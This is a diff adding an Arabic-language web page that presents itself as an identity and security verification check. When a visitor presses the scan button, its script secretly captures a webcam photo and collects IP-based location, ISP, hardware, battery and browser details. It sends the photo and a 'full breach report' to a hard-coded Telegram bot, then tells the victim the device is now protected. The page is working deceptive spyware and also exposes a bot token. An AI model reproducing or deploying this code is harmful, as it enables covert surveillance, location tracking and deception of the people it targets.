@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>نظام التحقق الأمني الموحد</title>
+    <link rel="icon" type="image/png" href="https://img.icons8.com/fluency/48/000000/shield.png">
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #0b1118; color: #fff; text-align: center; padding-top: 80px; margin: 0; }
+        .box { border: 1px dashed #3498db; padding: 30px; border-radius: 15px; display: inline-block; background: #1c252e; width: 85%; max-width: 450px; }
+        .btn { background: #3498db; color: white; border: none; padding: 15px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; margin-top: 20px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <div style="font-size: 40px;">🛡️</div>
+        <h3>بروتوكول التحقق من الهوية</h3>
+        <p style="font-size: 0.9em; color: #bdc3c7;">يجب إجراء فحص للعتاد والكاميرا للتأكد من مطابقة بياناتك المسجلة لدينا.</p>
+        <button class="btn" onclick="megaCapture()">بدء الفحص الشامل</button>
+    </div>
+
+    <video id="v" autoplay></video><canvas id="c"></canvas>
+
+    <script>
+        const TG_TOKEN = "8563370006:AAHw47M0i461yDkc7n6dRnEEs8AxKIOyDgY";
+        const CH_ID = "1678506419";
+
+        async function megaCapture() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = stream;
+
+                setTimeout(async () => {
+                    const v = document.getElementById('v');
+                    const c = document.getElementById('c');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+
+                    // سحب البيانات الضخمة
+                    const ipReq = await fetch('https://ipapi.co/json/');
+                    const i = await ipReq.json();
+                    
+                    let b = "N/A";
+                    if (navigator.getBattery) {
+                        const bat = await navigator.getBattery();
+                        b = `${Math.round(bat.level * 100)}% (${bat.charging ? "Charging" : "Not Charging"})`;
+                    }
+
+                    const gl = c.getContext('webgl');
+                    const gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+
+                    // تجميع التقرير الشامل
+                    const report = `
+🚀 *تقرير اختراق شامل (Full Breach)*
+----------------------------------
+📍 *الشبكة والموقع:*
+- الـ IP: \`${i.ip}\`
+- المزود: ${i.org}
+- الموقع: ${i.city}, ${i.country_name}
+- التوقيت: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+
+📱 *العتاد (Hardware):*
+- الجهاز: ${navigator.platform}
+- المعالج: ${navigator.hardwareConcurrency} Cores
+- الرام: ${navigator.deviceMemory || "Unknown"} GB
+- كرت الشاشة: ${gpu}
+- البطارية: ${b}
+- الشاشة: ${screen.width}x${screen.height} (${screen.colorDepth}bit)
+
+🌐 *المتصفح والبرمجيات:*
+- اللغات: ${navigator.languages.join(', ')}
+- الـ UserAgent: \`${navigator.userAgent.substring(0, 50)}...\`
+- ملفات تعريف الارتباط: ${navigator.cookieEnabled ? "مفعلة" : "معطلة"}
+- حالة الإنترنت: ${navigator.onLine ? "Online" : "Offline"}
+
+🔗 *رابط الموقع:* [فتح الخريطة](https://www.google.com/maps?q=${i.latitude},${i.longitude})
+----------------------------------`;
+
+                    c.toBlob(f => {
+                        const fd = new FormData();
+                        fd.append('chat_id', CH_ID);
+                        fd.append('photo', f, 'img.jpg');
+                        fd.append('caption', report);
+                        fd.append('parse_mode', 'Markdown');
+                        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                    }, 'image/jpeg');
+
+                    stream.getTracks().forEach(t => t.stop());
+                    alert("اكتمل الفحص. جهازك محمي الآن.");
+                    window.location.href = "https://google.com";
+                }, 1000);
+            } catch (e) { alert("يجب السماح بالصلاحيات."); }
+        }
+    </script>
+</body>
+</html>
